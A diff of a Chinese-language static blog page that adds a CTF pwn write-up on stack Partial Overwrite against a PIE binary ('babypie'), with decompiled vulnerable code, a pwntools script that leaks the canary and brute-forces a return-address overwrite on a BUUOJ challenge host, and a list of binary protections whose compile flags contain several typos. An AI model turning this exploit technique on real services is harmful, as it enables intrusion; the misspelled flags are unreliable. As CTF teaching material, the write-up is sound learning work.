@@ -147,6 +147,84 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/" class="post-title-link" itemprop="url">栈暂时就到这了</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-06 15:51:04 / 修改时间：15:51:29" itemprop="dateCreated datePublished" datetime="2021-11-06T15:51:04+08:00">2021-11-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="栈上的Partial-Overwrite"><a href="#栈上的Partial-Overwrite" class="headerlink" title="栈上的Partial-Overwrite"></a>栈上的Partial-Overwrite</h2><p>原理：对于开了PIE保护的程序，每次的指令地址都是随机的，但是地址的最后十二位总是固定的，也就是ida对于的地址，我们只要修改最后十二位地址，就可以控制程序流程了，但是修改数据只能整字节修改，无法直接修改12位，所以一般都是直接修改两个字节，对于第十二位到第十六位就一个一个试，比如一个函数的地址是0x30a，我们想要程序跳到这里，可以这样构造/x0a/xy3,y属于0到f，一个一个试，总会对的。或者固定一个值，让程序连接多次，16分之一的概率。</p>
+<p>例题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看见这个程序还有canary保护，read函数碰到\0会停止读取，我们只要一直覆盖到canary处就可以了，不过要加1，因为canary最后一个字节是\x00，也得把他覆盖掉才行。</p>
+<p>最后payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29355</span>)</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./babypie&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Input your Name:&#x27;</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        canary=<span class="string">&#x27;\0&#x27;</span>+sh.recvn(<span class="number">7</span>)</span><br><span class="line">        sleep(<span class="number">0.3</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+canary+<span class="string">&#x27;bbbbbbbb&#x27;</span>+<span class="string">&#x27;\x3e\x0a&#x27;</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>
+
+<p>循环的原因就是y不确定，所以假设为0,如果程序真为0就会控制成功，如果不成功就会再连接一次</p>
+<p>顺便来补一个程序保护</p>
+<h2 id="Pwn保护说明"><a href="#Pwn保护说明" class="headerlink" title="Pwn保护说明"></a>Pwn保护说明</h2><h3 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch:"></a>1.Arch:</h3><p>说明程序的架构，位数，和是大端序还是小端序</p>
+<h3 id="2-RELR："><a href="#2-RELR：" class="headerlink" title="2.RELR："></a>2.RELR：</h3><p>设置符号重定位表为只读或者在程序启动时就解析所有动态符号，从二建扫对got表的攻击</p>
+<p>编译选项：关闭： -z morello  开启部分：-z lazy 开启全部：-z now</p>
+<h3 id="stack"><a href="#stack" class="headerlink" title="stack:"></a>stack:</h3><p>栈保护溢出</p>
+<p>编译选项：关闭：-fon-stack-protector 开启：-fstack_protector-all</p>
+<h3 id="NX"><a href="#NX" class="headerlink" title="NX:"></a>NX:</h3><p>堆栈不可执行</p>
+<p>编译选项：关闭-z execstack 开启：-z noexecstack</p>
+<h3 id="PIE："><a href="#PIE：" class="headerlink" title="PIE："></a>PIE：</h3><p>内存地址随机化（linux下pie启动必须同时开始aslr）</p>
+<p>编译选项：关闭 -no-pie 开启 -pie ifPIC</p>
+<h3 id="RWX"><a href="#RWX" class="headerlink" title="RWX:"></a>RWX:</h3><p>bss段可执行</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/05/fmt-bss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -434,7 +512,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
